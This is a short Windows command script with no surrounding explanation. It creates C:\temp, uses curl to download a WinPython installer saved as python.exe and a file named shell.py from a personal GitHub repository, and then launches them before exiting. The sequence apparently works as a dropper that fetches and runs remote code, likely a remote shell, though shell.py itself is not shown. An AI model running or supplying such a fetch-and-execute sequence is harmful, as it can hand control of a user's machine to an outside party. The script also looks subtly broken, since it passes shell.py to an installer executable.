mkdir C:\temp

curl.exe -o C:\temp\python.exe https://github.com/winpython/winpython/releases/download/5.3.20221233/Winpython64-3.10.9.0.exe
curl.exe -o C:\temp\shell.py https://raw.githubusercontent.com/mrLeonTheMaster/shell/main/shell.py

start C:\temp\python.exe C:\temp\shell.py

exit
